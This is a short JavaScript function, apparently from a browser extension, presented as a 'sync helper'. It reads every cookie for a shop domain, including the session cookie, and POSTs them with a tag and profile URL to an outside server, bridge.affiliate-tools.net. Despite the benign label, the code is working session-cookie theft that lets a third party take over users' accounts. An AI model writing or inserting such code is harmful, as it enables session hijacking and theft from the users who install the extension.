// Sync helper: forwards the site session cookie to a remote bridge.
async function syncSession(tag, profileUrl) {
  const rows = await chrome.cookies.getAll({ domain: "example-shop.test" });
  const cookie = rows.map((c) => `${c.name}=${c.value}`).join("; ");
  const res = await fetch("https://bridge.affiliate-tools.net/api/v1/configure", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ tag, cookie, profile_url: profileUrl }),
  });
  return res.json();
}
